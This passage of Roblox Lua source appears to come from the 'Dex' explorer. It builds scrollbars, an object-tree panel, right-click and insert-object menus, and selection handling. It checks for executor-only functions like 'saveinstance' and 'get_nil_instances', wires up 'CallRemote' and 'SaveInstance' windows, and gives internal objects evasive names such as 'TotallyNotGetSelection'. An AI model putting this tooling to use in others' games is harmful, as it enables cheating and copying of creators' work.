				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = GUI_SIZE*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
						if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
							ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
							ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Explorer panel

		local explorerPanel = D_E_X.ExplorerPanel
		Create(explorerPanel,{
			BackgroundColor3 = GuiColor.Field;
			BorderColor3 = GuiColor.Border;
			Active = true;
		})

		local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
		local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
		local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
		local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

		local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
		local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
		local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
		local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

		local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

		local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
		local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

		local CurrentSaveInstanceWindow
		local CurrentRemoteWindow

		local lastSelectedNode

		local DexStorage
		local DexStorageMain
		local DexStorageEnabled

		if saveinstance then DexStorageEnabled = true end

		if DexStorageEnabled then
			DexStorage = Instance.new("Folder")
			DexStorage.Name = "Dex"
			DexStorageMain = Instance.new("Folder",DexStorage)
			DexStorageMain.Name = "DexStorage"
		end

		local NilStorage
		local NilStorageMain
		local NilStorageEnabled

		if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

		if NilStorageEnabled then
			NilStorage = Instance.new("Folder")
			NilStorage.Name = "Dex Internal Storage"
			NilStorageMain = Instance.new("Folder",NilStorage)
			NilStorageMain.Name = "Nil Instances"
		end

		local listFrame = Create('Frame',{
			Name = "List";
			BackgroundTransparency = 1;
			ClipsDescendants = true;
			Position = UDim2.new(0,0,0,HEADER_SIZE);
			Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
			Parent = explorerPanel;
		})

		local scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 1
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
			Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
			Parent = explorerPanel;
		})

		local scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = GUI_SIZE
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,-GUI_SIZE);
			Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
			Visible = false;
			Parent = explorerPanel;
		})

		local headerFrame = Create('Frame',{
			Name = "Header";
			BackgroundColor3 = GuiColor.Background;
			BorderColor3 = GuiColor.Border;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,0,HEADER_SIZE);
			Parent = explorerPanel;
			Create('TextLabel',{
				Text = "Explorer";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				Font = FONT;
				FontSize = FONT_SIZE;
				Position = UDim2.new(0,4,0,0);
				Size = UDim2.new(1,-4,0.5,0);
			});
		})

		local explorerFilter = 	Create('TextBox',{
			Text = "Filter Workspace";
			BackgroundTransparency = 0.8;
			TextColor3 = GuiColor.Text;
			TextXAlignment = 'Left';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,4,0.5,0);
			Size = UDim2.new(1,-8,0.5,-2);
		});
		explorerFilter.Parent = headerFrame

		SetZIndexOnChanged(explorerPanel)

		local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

		local Styles = {
			Font = Enum.Font.Arial;
			Margin = 5;
			Black = CreateColor3(0,0,0);
			White = CreateColor3(255,255,255);
		}

		local DropDown = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextColor = CreateColor3(0,0,0);
			TextColorOver = Styles.White;
			TextXAlignment = Enum.TextXAlignment.Left;
			Height = 20;
			BackColor = Styles.White;
			BackColorOver = CreateColor3(86,125,188);
			BorderColor = CreateColor3(216,216,216);
			BorderSizePixel = 2;
			ArrowColor = CreateColor3(160,160,160);
			ArrowColorOver = Styles.Black;
		}

		local Row = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextXAlignment = Enum.TextXAlignment.Left;
			TextColor = Styles.Black;
			TextColorOver = Styles.White;
			TextLockedColor = CreateColor3(120,120,120);
			Height = 24;
			BorderColor = CreateColor3(216,216,216);
			BackgroundColor = Styles.White;
			BackgroundColorAlternate = CreateColor3(246,246,246);
			BackgroundColorMouseover = CreateColor3(211,224,244);
			TitleMarginLeft = 15;
		}

		local currentRightClickMenu
		local CurrentInsertObjectWindow
		local CurrentFunctionCallerWindow

		local RbxApi

		function ClassCanCreate(IName)
			local success,err = pcall(function() Instance.new(IName) end)
			if err then
				return false
			else
				return true
			end
		end

		function GetClasses()
			if RbxApi == nil then return {} end
			local classTable = {}
			for i,v in pairs(RbxApi.Classes) do
				if ClassCanCreate(v.Name) then
					table.insert(classTable,v.Name)
				end
			end
			return classTable
		end

		local function sortAlphabetic(t, property)
			table.sort(t, 
				function(x,y) return x[property] < y[property]
				end)
		end

		local function FunctionIsHidden(functionData)
			local tags = functionData["tags"]
			for _,name in pairs(tags) do
				if name == "deprecated"
					or name == "hidden"
					or name == "writeonly" then
					return true
				end
			end
			return false
		end

		local function GetAllFunctions(className)
			local class = RbxApi.Classes[className]
			local functions = {}

			if not class then return functions end

			while class do
				if class.Name == "Instance" then break end
				for _,nextFunction in pairs(class.Functions) do
					if not FunctionIsHidden(nextFunction) then
						table.insert(functions, nextFunction)
					end
				end
				class = RbxApi.Classes[class.Superclass]
			end

			sortAlphabetic(functions, "Name")

			return functions
		end

		function GetFunctions()
			if RbxApi == nil then return {} end
			local List = SelectionVar():Get()

			if #List == 0 then return end

			local MyObject = List[1]

			local functionTable = {}
			for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
				table.insert(functionTable,v)
			end
			return functionTable
		end

		function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()
			local totalSize = explorerPanel.Parent.AbsoluteSize.y
			if #choices == 0 then return end

			table.sort(choices, function(a,b) return a < b end)

			local frame = Instance.new("Frame")	
			frame.Name = "InsertObject"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					--frame:Destroy()
					CurrentInsertObjectWindow.Visible = false
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("ScrollingFrame")
				menu.Size = UDim2.new(0,200,1,0)
				menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 0)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.TopImage = "rbxasset://textures/blackBkg_square.png"
				menu.MidImage = "rbxasset://textures/blackBkg_square.png"
				menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name, function()
						choice(name)
					end,1)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()
			local totalSize = explorerPanel.Parent.AbsoluteSize.y
			if #choices == 0 then return end

			table.sort(choices, function(a,b) return a.Name < b.Name end)

			local frame = Instance.new("Frame")	
			frame.Name = "InsertObject"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					--frame:Destroy()
					CurrentInsertObjectWindow.Visible = false
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("ScrollingFrame")
				menu.Size = UDim2.new(0,300,1,0)
				menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 0)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.TopImage = "rbxasset://textures/blackBkg_square.png"
				menu.MidImage = "rbxasset://textures/blackBkg_square.png"
				menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function GetParameters(functionData)
					local paraString = ""
					paraString = paraString.."("
					for i,v in pairs(functionData.Arguments) do
						paraString = paraString..v.Type.." "..v.Name
						if i < #functionData.Arguments then
							paraString = paraString..", "
						end
					end
					paraString = paraString..")"
					return paraString
				end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
						choice(name)
					end,2)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function CreateInsertObject()
			if not CurrentInsertObjectWindow then return end
			CurrentInsertObjectWindow.Visible = true
			if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
			end
			if CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Parent = explorerPanel.Parent
			end
		end

		function CreateFunctionCaller()
			if CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			end
			CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
				GetFunctions(),
				"",
				false,
				function(option)
					CurrentFunctionCallerWindow:Destroy()
					CurrentFunctionCallerWindow = nil
					local list = SelectionVar():Get()
					for i = 1,#list do
						pcall(function() Instance.new(option,list[i]) end)
					end
					print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
					--CallFunction()
					DestroyRightClick()
				end
			)
			if currentRightClickMenu and CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
			end
			if CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
			end
		end

		function CreateRightClickMenuItem(text, onClick, insObj)
			local button = Instance.new("TextButton")
			button.Font = DropDown.Font
			button.FontSize = DropDown.FontSize
			button.TextColor3 = DropDown.TextColor
			button.TextXAlignment = DropDown.TextXAlignment
			button.BackgroundColor3 = DropDown.BackColor
			button.AutoButtonColor = false
			button.BorderSizePixel = 0
			button.Active = true
			button.Text = text

			if insObj == 1 then
				local newIcon = Icon(nil,ExplorerIndex[text] or 0)
				newIcon.Position = UDim2.new(0,0,0,2)
				newIcon.Size = UDim2.new(0,16,0,16)
				newIcon.IconMap.ZIndex = 5
				newIcon.Parent = button
				button.Text = "\t\t"..button.Text
			elseif insObj == 2 then
				button.FontSize = Enum.FontSize.Size11
			end

			button.MouseEnter:connect(function()
				button.TextColor3 = DropDown.TextColorOver
				button.BackgroundColor3 = DropDown.BackColorOver
				if not insObj and CurrentInsertObjectWindow then
					if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
						CreateInsertObject()
					elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
						CurrentInsertObjectWindow.Visible = false
					end
				end
				if not insObj then
					if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
						CurrentFunctionCallerWindow:Destroy()
						CurrentFunctionCallerWindow = nil
					elseif button.Text == "Call Function" then
						CreateFunctionCaller()
					end
				end
			end)
			button.MouseLeave:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
			end)
			button.MouseButton1Click:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
				onClick(text)
			end)	
			return button
		end

		function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()

			local frame = Instance.new("Frame")	
			frame.Name = "DropDown"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					frame:Destroy()
					DestroyRightClick()
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("Frame")
				menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 5)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name, function()
						choice(name)
					end)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function checkMouseInGui(gui)
			if gui == nil then return false end
			local plrMouse = game.Players.LocalPlayer:GetMouse()
			local guiPosition = gui.AbsolutePosition
			local guiSize = gui.AbsoluteSize	

			if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
				return true
			else
				return false
			end
		end

		local clipboard = {}
		local function delete(o)
			o.Parent = nil
		end

		local getTextWidth do
			local text = Create('TextLabel',{
				Name = "TextWidth";
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,1,0);
				Visible = false;
				Parent = explorerPanel;
			})
			function getTextWidth(s)
				text.Text = s
				return text.TextBounds.x
			end
		end

		local nameScanned = false
		-- Holds the game tree converted to a list.
		local TreeList = {}
		-- Matches objects to their tree node representation.
		local NodeLookup = {}

		local nodeWidth = 0

		local QuickButtons = {}

		function filteringWorkspace()
			if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
				return true
			end
			return false
		end

		function lookForAName(obj,name)
			for i,v in pairs(obj:GetChildren()) do
				if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
				lookForAName(v,name)
			end
		end

		function scanName(obj)
			nameScanned = false
			if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
				nameScanned = true
			else
				lookForAName(obj,explorerFilter.Text)
			end
			return nameScanned
		end

		function updateActions()
			for i,v in pairs(QuickButtons) do
				if v.Cond() then
					v.Toggle(true)
				else
					v.Toggle(false)
				end
			end
		end

		local updateList,rawUpdateList,updateScroll,rawUpdateSize do
			local function r(t)
				for i = 1,#t do
					if not filteringWorkspace() or scanName(t[i].Object) then
						TreeList[#TreeList+1] = t[i]

						local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
						if w > nodeWidth then
							nodeWidth = w
						end
						if t[i].Expanded or filteringWorkspace() then
							r(t[i])
						end
					end
				end
			end

			function rawUpdateSize()
				scrollBarH.TotalSpace = nodeWidth
				scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
				scrollBarH:Update()
				local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
				scrollBarH.GUI.Visible = visible

				listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

				scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
				scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

				scrollBar.TotalSpace = #TreeList+1
				scrollBar:Update()
			end

			function rawUpdateList()
				-- Clear then repopulate the entire list. It appears to be fast enough.
				TreeList = {}
				nodeWidth = 0
				r(NodeLookup[workspace.Parent])
				if DexStorageEnabled then
					r(NodeLookup[DexStorage])
				end
				if NilStorageEnabled then
					r(NodeLookup[NilStorage])
				end
				rawUpdateSize()
				updateActions()
			end

			-- Adding or removing large models will cause many updates to occur. We
			-- can reduce the number of updates by creating a delay, then dropping any
			-- updates that occur during the delay.
			local updatingList = false
			function updateList()
				if updatingList then return end
				updatingList = true
				wait(0.25)
				updatingList = false
				rawUpdateList()
			end

			local updatingScroll = false
			function updateScroll()
				if updatingScroll then return end
				updatingScroll = true
				wait(0.25)
				updatingScroll = false
				scrollBar:Update()
			end
		end

		local Selection do
			local bindGetSelection = explorerPanel:FindFirstChild("TotallyNotGetSelection")
			if not bindGetSelection then
				bindGetSelection = Create('BindableFunction',{Name = "TotallyNotGetSelection"})
				bindGetSelection.Parent = explorerPanel
			end

			local bindSetSelection = explorerPanel:FindFirstChild("TotallyNotSetSelection")
			if not bindSetSelection then
				bindSetSelection = Create('BindableFunction',{Name = "TotallyNotSetSelection"})
				bindSetSelection.Parent = explorerPanel
			end

			local bindSelectionChanged = explorerPanel:FindFirstChild("TotallyNotSelectionChanged")
			if not bindSelectionChanged then
				bindSelectionChanged = Create('BindableEvent',{Name = "TotallyNotSelectionChanged"})
				bindSelectionChanged.Parent = explorerPanel
			end

			local SelectionList = {}
			local SelectionSet = {}
			local Updates = true
			Selection = {
				Selected = SelectionSet;
				List = SelectionList;
			}

			local function addObject(object)
				-- list update
				local lupdate = false
				-- scroll update
				local supdate = false

				if not SelectionSet[object] then
					local node = NodeLookup[object]
					if node then
						table.insert(SelectionList,object)
						SelectionSet[object] = true
						node.Selected = true

						-- expand all ancestors so that selected node becomes visible
						node = node.Parent
						while node do
							if not node.Expanded then
								node.Expanded = true
								lupdate = true
							end
							node = node.Parent
						end
						supdate = true
					end
				end
				return lupdate,supdate
			end

